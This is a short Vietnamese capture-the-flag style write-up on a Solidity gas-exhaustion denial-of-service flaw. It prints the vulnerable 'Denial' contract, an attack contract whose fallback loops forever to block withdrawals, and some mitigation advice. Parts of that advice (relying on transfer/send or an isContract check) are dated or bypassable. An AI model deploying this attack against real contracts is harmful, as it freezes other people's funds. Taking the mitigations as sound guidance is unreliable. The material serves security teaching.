### Kết luận
- Lỗ hổng: Lỗ hổng trong cơ chế `call` để chuyển tiền, nếu đối tác (partner) là một hợp đồng độc hại với hàm `fallback` tiêu tốn nhiều gas hoặc chạy mã phức tạp, nó có thể gây hết gas và ngăn hàm `withdraw` tiếp tục thực hiện. (tấn công kiểu gây rối, bên tấn công cũng ko thu được ether từ hợp đồng chủ sở hữu).
- Cách phòng tránh: Giới hạn lượng gas cung cấp khi dùng `call`, Sử dụng phương pháp chuyển tiền an toàn hơn (VD: `transfer`, `send`, ... ), thêm chỉ chấp nhận địa chỉ đáng tin cậy:
```solidity
require(!isContract(partner), "Partner cannot be a contract");
```


### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract DenialAttack {
    fallback() external payable {
        while (true) {
            // Lặp vô hạn để tiêu tốn toàn bộ gas
        }
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
